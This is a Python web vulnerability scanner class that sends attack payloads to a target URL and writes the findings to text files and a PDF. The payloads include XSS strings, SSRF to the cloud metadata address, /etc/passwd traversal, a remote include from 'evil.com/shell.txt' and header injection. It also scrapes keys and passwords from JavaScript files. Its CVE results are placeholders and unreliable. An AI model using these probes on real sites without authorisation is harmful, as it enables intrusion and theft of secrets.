#!/usr/bin/env python3

import os
import sys
import json
import requests
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
from datetime import datetime
from waybackpy import WaybackMachineCDXServerAPI
from concurrent.futures import ThreadPoolExecutor
import re
import socket
import dns.resolver
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet

class SecurityScanner:
    def __init__(self, target_url, proxy=None):
        self.target_url = target_url
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        self.results = {
            'xss': [],
            'open_redirect': [],
            'subdomain_takeover': [],
            'cors': [],
            'ssrf': [],
            'lfi': [],
            'sqli': [],
            'host_header': [],
            'http_methods': [],
            'cve': [],
            'js_secrets': [],
            'wayback_params': [],
            'rate_limit': []
        }

    def save_results(self, scan_type, results):
        """Save scan results to file"""
        filename = f"data/{scan_type}_vuln.txt"
        os.makedirs('data', exist_ok=True)
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"\n=== Scan Results for {self.target_url} ===\n")
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(json.dumps(results, indent=2))
            f.write("\n" + "="*50 + "\n")

    def export_to_pdf(self, filename="scan_report.pdf"):
        """Export scan results to PDF"""
        doc = SimpleDocTemplate(filename, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []
        
        # Add title
        title = Paragraph(f"Security Scan Report for {self.target_url}", styles['Title'])
        story.append(title)
        story.append(Spacer(1, 12))
        
        # Add results for each scan type
        for scan_type, results in self.results.items():
            if results:
                heading = Paragraph(f"{scan_type.upper()} Findings:", styles['Heading1'])
                story.append(heading)
                story.append(Spacer(1, 12))
                
                for result in results:
                    p = Paragraph(str(result), styles['Normal'])
                    story.append(p)
                    story.append(Spacer(1, 6))
        
        doc.build(story)

    async def check_xss(self):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>"
        ]
        
        params = self.extract_parameters()
        for param in params:
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    if payload in response.text:
                        result = {
                            'parameter': param,
                            'payload': payload,
                            'type': 'Reflected XSS'
                        }
                        self.results['xss'].append(result)
                        print(f"{Fore.GREEN}[+] Found XSS vulnerability in parameter: {param}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error checking XSS: {str(e)}")

    def check_open_redirect(self):
        """Check for open redirect vulnerabilities"""
        redirect_payloads = [
            "//google.com",
            "//google.com%2f%2e%2e",
            "//google%00.com",
            "//google.com%5c%2e%2e"
        ]
        
        params = self.extract_parameters()
        for param in params:
            for payload in redirect_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        allow_redirects=False,
                        timeout=10
                    )
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'google.com' in location:
                            result = {
                                'parameter': param,
                                'payload': payload,
                                'redirect_url': location
                            }
                            self.results['open_redirect'].append(result)
                            print(f"{Fore.GREEN}[+] Found open redirect in parameter: {param}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error checking open redirect: {str(e)}")

    def check_subdomain_takeover(self):
        """Check for subdomain takeover vulnerabilities"""
        try:
            domain = urlparse(self.target_url).netloc
            resolver = dns.resolver.Resolver()
            
            # Check for CNAME records
            try:
                answers = resolver.resolve(domain, 'CNAME')
                for answer in answers:
                    cname = str(answer)
                    if cname.endswith('.github.io') or cname.endswith('.cloudfront.net'):
                        result = {
                            'subdomain': domain,
                            'cname': cname,
                            'vulnerable': True
                        }
                        self.results['subdomain_takeover'].append(result)
                        print(f"{Fore.GREEN}[+] Potential subdomain takeover found: {domain}")
            except dns.resolver.NoAnswer:
                print(f"{Fore.YELLOW}[!] No CNAME records found for {domain}")
            except dns.resolver.NXDOMAIN:
                print(f"{Fore.YELLOW}[!] Domain {domain} does not exist")
            
            # Check for A records
            try:
                a_records = resolver.resolve(domain, 'A')
                for record in a_records:
                    ip = str(record)
                    # Check if IP belongs to known hosting services
                    if ip.startswith('185.199.') or ip.startswith('151.101.'):  # GitHub Pages IPs
                        result = {
                            'subdomain': domain,
                            'ip': ip,
                            'vulnerable': True,
                            'type': 'A Record'
                        }
                        self.results['subdomain_takeover'].append(result)
                        print(f"{Fore.GREEN}[+] Potential subdomain takeover found via A record: {domain}")
            except dns.resolver.NoAnswer:
                print(f"{Fore.YELLOW}[!] No A records found for {domain}")
            
            # Check for NS records
            try:
                ns_records = resolver.resolve(domain, 'NS')
                for record in ns_records:
                    ns = str(record)
                    if 'github.io' in ns or 'cloudfront.net' in ns:
                        result = {
                            'subdomain': domain,
                            'nameserver': ns,
                            'vulnerable': True,
                            'type': 'NS Record'
                        }
                        self.results['subdomain_takeover'].append(result)
                        print(f"{Fore.GREEN}[+] Potential subdomain takeover found via NS record: {domain}")
            except dns.resolver.NoAnswer:
                print(f"{Fore.YELLOW}[!] No NS records found for {domain}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking subdomain takeover: {str(e)}")
            print(f"{Fore.YELLOW}[!] Continuing with other checks...")

    def check_cors(self):
        """Check for CORS misconfigurations"""
        try:
            response = self.session.get(
                self.target_url,
                headers={'Origin': 'https://evil.com'},
                timeout=10
            )
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            
            if acao == '*' or (acao and acac == 'true'):
                result = {
                    'acao': acao,
                    'acac': acac,
                    'vulnerable': True
                }
                self.results['cors'].append(result)
                print(f"{Fore.GREEN}[+] Found CORS misconfiguration")
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking CORS: {str(e)}")

    def check_ssrf(self):
        """Check for SSRF vulnerabilities"""
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://169.254.169.254"  # AWS metadata
        ]
        
        params = self.extract_parameters()
        for param in params:
            for payload in ssrf_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    if any(ip in response.text for ip in ['localhost', '127.0.0.1', '[::1]']):
                        result = {
                            'parameter': param,
                            'payload': payload,
                            'response_length': len(response.text)
                        }
                        self.results['ssrf'].append(result)
                        print(f"{Fore.GREEN}[+] Potential SSRF found in parameter: {param}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error checking SSRF: {str(e)}")

    def check_lfi(self):
        """Check for LFI/RFI vulnerabilities"""
        lfi_payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "http://evil.com/shell.txt",
            "file:///etc/passwd"
        ]
        
        params = self.extract_parameters()
        for param in params:
            for payload in lfi_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    if 'root:' in response.text or '<?php' in response.text:
                        result = {
                            'parameter': param,
                            'payload': payload,
                            'type': 'LFI/RFI'
                        }
                        self.results['lfi'].append(result)
                        print(f"{Fore.GREEN}[+] Potential LFI/RFI found in parameter: {param}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error checking LFI/RFI: {str(e)}")

    def generate_sqli_dorks(self):
        """Generate SQL injection dorks"""
        dorks = [
            f"site:{self.target_url} inurl:index.php?id=",
            f"site:{self.target_url} inurl:page.php?id=",
            f"site:{self.target_url} inurl:article.php?id=",
            f"site:{self.target_url} inurl:product.php?id="
        ]
        return dorks

    def check_host_header(self):
        """Check for host header injection"""
        headers = {
            'Host': 'evil.com',
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com'
        }
        
        try:
            response = self.session.get(
                self.target_url,
                headers=headers,
                timeout=10
            )
            
            if 'evil.com' in response.text:
                result = {
                    'headers_checked': list(headers.keys()),
                    'vulnerable': True
                }
                self.results['host_header'].append(result)
                print(f"{Fore.GREEN}[+] Found host header injection")
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking host header: {str(e)}")

    def check_http_methods(self):
        """Test various HTTP methods"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH']
        results = []
        
        for method in methods:
            try:
                response = self.session.request(
                    method,
                    self.target_url,
                    timeout=10
                )
                results.append({
                    'method': method,
                    'status_code': response.status_code,
                    'allowed': response.status_code != 405
                })
            except Exception as e:
                print(f"{Fore.RED}[-] Error checking {method}: {str(e)}")
        
        self.results['http_methods'] = results
        print(f"{Fore.GREEN}[+] HTTP methods checked")

    def check_cve(self):
        """Check for CVE vulnerabilities based on detected technology"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for common CMS and technologies
            technologies = []
            
            # WordPress
            if 'wp-content' in response.text:
                technologies.append('WordPress')
            
            # Joomla
            if 'joomla' in response.text.lower():
                technologies.append('Joomla')
            
            # Drupal
            if 'drupal' in response.text.lower():
                technologies.append('Drupal')
            
            # Check for version information
            for tech in technologies:
                # Here you would typically query a CVE database
                # This is a simplified example
                result = {
                    'technology': tech,
                    'potential_cves': ['CVE-2023-XXXX', 'CVE-2023-YYYY']
                }
                self.results['cve'].append(result)
                print(f"{Fore.GREEN}[+] Found potential CVEs for {tech}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking CVEs: {str(e)}")

    def scan_js_files(self):
        """Scan JavaScript files for sensitive information"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            js_files = []
            for script in soup.find_all('script'):
                if script.get('src'):
                    js_files.append(urljoin(self.target_url, script['src']))
            
            for js_file in js_files:
                try:
                    js_response = self.session.get(js_file, timeout=10)
                    content = js_response.text
                    
                    # Look for sensitive patterns
                    patterns = {
                        'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)',
                        'token': r'token["\']?\s*[:=]\s*["\']([^"\']+)',
                        'endpoint': r'https?://[^\s"\']+',
                        'password': r'password["\']?\s*[:=]\s*["\']([^"\']+)'
                    }
                    
                    for pattern_name, pattern in patterns.items():
                        matches = re.findall(pattern, content)
                        if matches:
                            result = {
                                'file': js_file,
                                'type': pattern_name,
                                'matches': matches
                            }
                            self.results['js_secrets'].append(result)
                            print(f"{Fore.GREEN}[+] Found {pattern_name} in {js_file}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error scanning {js_file}: {str(e)}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error scanning JS files: {str(e)}")

    def extract_wayback_params(self):
        """Extract parameters from Wayback Machine"""
        try:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            cdx_api = WaybackMachineCDXServerAPI(self.target_url, user_agent)
            
            snapshots = cdx_api.snapshots()
            params = set()
            
            for snapshot in snapshots:
                url = snapshot.original
                parsed = urlparse(url)
                if parsed.query:
                    params.update(parsed.query.split('&'))
            
            result = {
                'parameters': list(params)
            }
            self.results['wayback_params'] = result
            print(f"{Fore.GREEN}[+] Extracted {len(params)} parameters from Wayback Machine")
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting Wayback parameters: {str(e)}")

    def check_rate_limiting(self):
        """Check for rate limiting"""
        try:
            responses = []
            for _ in range(50):  # Send 50 requests quickly
                response = self.session.get(self.target_url, timeout=10)
                responses.append(response.status_code)
            
            # Check if we got rate limited
            if 429 in responses or any(code >= 500 for code in responses):
                result = {
                    'rate_limited': True,
                    'status_codes': responses
                }
                self.results['rate_limit'].append(result)
                print(f"{Fore.GREEN}[+] Rate limiting detected")
            else:
                print(f"{Fore.YELLOW}[!] No rate limiting detected")
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking rate limiting: {str(e)}")

    def extract_parameters(self):
        """Extract parameters from the target URL"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            params = set()
            
            # Get parameters from forms
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        params.add(input_tag['name'])
            
            # Get parameters from URL
            parsed = urlparse(self.target_url)
            if parsed.query:
                params.update(parsed.query.split('&'))
            
            return list(params)
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting parameters: {str(e)}")
            return []

    def run_all_scans(self):
        """Run all security scans"""
        print(f"{Fore.CYAN}[*] Starting security scan for {self.target_url}")
        
        # Run all scans
        asyncio.run(self.check_xss())
        self.check_open_redirect()
        self.check_subdomain_takeover()
        self.check_cors()
        self.check_ssrf()
        self.check_lfi()
        self.check_host_header()
        self.check_http_methods()
        self.check_cve()
        self.scan_js_files()
        self.extract_wayback_params()
        self.check_rate_limiting()
        
        # Save results
        for scan_type, results in self.results.items():
            if results:
                self.save_results(scan_type, results)
        
        # Export to PDF
        self.export_to_pdf()
        
        print(f"{Fore.GREEN}[+] Security scan completed for {self.target_url}") 